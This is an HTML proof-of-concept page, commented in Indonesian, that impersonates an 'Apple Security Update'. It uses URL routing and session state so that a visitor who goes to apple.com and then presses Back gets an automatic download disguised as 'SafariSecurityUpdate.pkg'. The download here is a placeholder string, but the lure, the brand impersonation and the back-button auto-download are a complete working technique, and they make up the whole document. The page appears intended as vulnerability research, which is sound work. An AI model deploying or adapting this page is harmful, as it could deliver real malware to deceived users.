<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple Security Update (PoC)</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            padding: 20px; 
            background: #fafafa;
            color: #333;
        }
        #ui-container {
            max-width: 500px;
            margin: 40px auto;
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            text-align: center;
        }
        a.button { 
            display: inline-block;
            margin-top: 20px;
            padding: 10px 20px;
            background: #007aff;
            color: #fff;
            text-decoration: none;
            border-radius: 6px;
            font-weight: bold;
        }
        a.button:hover {
            background: #005bb5;
        }
        .instruction {
            margin-top: 30px;
            font-size: 13px;
            color: #888;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
    </style>
</head>
<body>

    <div id="ui-container">
        <h2>Loading...</h2>
    </div>

    <script>
        // Ambil routing dari URL parameter (?route=...)
        const urlParams = new URLSearchParams(window.location.search);
        const route = urlParams.get('route');
        const container = document.getElementById('ui-container');

        // ROUTE 1: "/" (Inisiasi State)
        if (!route || route === 'start') {
            // Set state bahwa user sudah visit halaman umpan
            sessionStorage.setItem('hasVisited', 'true');
            // Redirect ke halaman lure tanpa history tambahan (replace)
            window.location.replace('?route=lure-page');
        }
        
        // ROUTE 2: "/lure-page.html" (Halaman Umpan)
        else if (route === 'lure-page') {
            const hasVisited = sessionStorage.getItem('hasVisited');

            if (hasVisited === 'true') {
                // Reset state agar jika kembali ke sini, logic berubah
                sessionStorage.setItem('hasVisited', 'false');

                // Render UI Apple Security
                container.innerHTML = `
                    <h1 style="color: #000;">Apple Security Update</h1>
                    <p>Please proceed to the main site for verification.</p>
                    <a href="https://www.apple.com" class="button">Continue to Apple.com</a>
                    
                    <div class="instruction">
                        <b>PoC Testing Steps:</b><br>
                        1. Click the button above to leave this page.<br>
                        2. Once on Apple.com, click your browser's <b>BACK</b> button.<br>
                        3. The automated download will trigger.
                    </div>
                `;
            } else {
                // Jika hasVisited sudah false (berarti user menekan tombol Back), eksekusi download
                window.location.replace('?route=trigger-download');
            }
        }
        
        // ROUTE 3: "/trigger-download" (Eksekusi Payload)
        else if (route === 'trigger-download') {
            container.innerHTML = `
                <h2 style="color: #d9534f;">Payload Triggered!</h2>
                <p>The proof-of-concept file has been downloaded.</p>
            `;

            // Proses pembuatan file virtual dan trigger download otomatis
            const fakeFileContent = "This is a proof-of-concept file.";
            const blob = new Blob([fakeFileContent], { type: 'application/octet-stream' });
            const blobUrl = URL.createObjectURL(blob);

            // Bikin elemen <a> tersembunyi untuk auto-click
            const downloadLink = document.createElement('a');
            downloadLink.href = blobUrl;
            downloadLink.download = 'SafariSecurityUpdate.pkg';
            document.body.appendChild(downloadLink);
            downloadLink.click();
            
            // Cleanup
            document.body.removeChild(downloadLink);
            URL.revokeObjectURL(blobUrl);
        }
    </script>
</body>
</html>
